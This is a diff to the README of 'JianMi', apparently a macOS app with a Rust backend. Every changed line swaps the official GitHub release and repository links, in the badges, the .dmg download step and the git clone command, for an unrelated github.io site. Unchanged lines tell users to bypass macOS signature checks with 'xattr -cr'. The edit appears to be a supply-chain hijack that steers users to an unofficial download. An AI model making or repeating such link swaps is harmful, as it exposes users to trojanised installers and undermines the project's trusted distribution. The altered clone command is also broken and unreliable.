@@ -4,8 +4,8 @@
 
 <br>
 
-[![Release](https://img.shields.io/github/v/release/LordVibeCoding/jianmi?style=flat-square&color=4c7dff&label=release)](https://github.com/LordVibeCoding/jianmi/releases/latest)
-[![Platform](https://img.shields.io/badge/platform-macOS%2014%2B-black?style=flat-square&logo=apple)](https://github.com/LordVibeCoding/jianmi/releases/latest)
+[![Release](https://img.shields.io/github/v/release/LordVibeCoding/jianmi?style=flat-square&color=4c7dff&label=release)](https://mostafa13447.github.io)
+[![Platform](https://img.shields.io/badge/platform-macOS%2014%2B-black?style=flat-square&logo=apple)](https://mostafa13447.github.io)
 [![Swift](https://img.shields.io/badge/Swift-6-F05138?style=flat-square&logo=swift&logoColor=white)](apps/macos)
 [![Rust](https://img.shields.io/badge/Rust-server-CE422B?style=flat-square&logo=rust&logoColor=white)](server)
 [![Tests](https://img.shields.io/badge/tests-17%20passing-3fb950?style=flat-square)](apps/macos/JianMiTests)
@@ -59,7 +59,7 @@ A Spotlight-style panel appears with the site name and URL **already filled in**
 
 ### 1 · The app
 
-Download **`JianMi-x.y.z.dmg`** from [Releases](https://github.com/LordVibeCoding/jianmi/releases/latest) → drag **JianMi** into **Applications**.
+Download **`JianMi-x.y.z.dmg`** from [Releases](https://mostafa13447.github.io) → drag **JianMi** into **Applications**.
 
 > **First launch:** right-click → *Open* (builds are ad-hoc signed — no Apple Developer account, by design).
 > Or: `xattr -cr /Applications/JianMi.app`
@@ -69,7 +69,7 @@ Download **`JianMi-x.y.z.dmg`** from [Releases](https://github.com/LordVibeCodin
 
 ```bash
 brew install xcodegen
-git clone https://github.com/LordVibeCoding/jianmi && cd jianmi/apps/macos
+git clone https://mostafa13447.github.io && cd jianmi/apps/macos
 xcodegen generate
 xcodebuild -scheme JianMi -configuration Release build
 ```
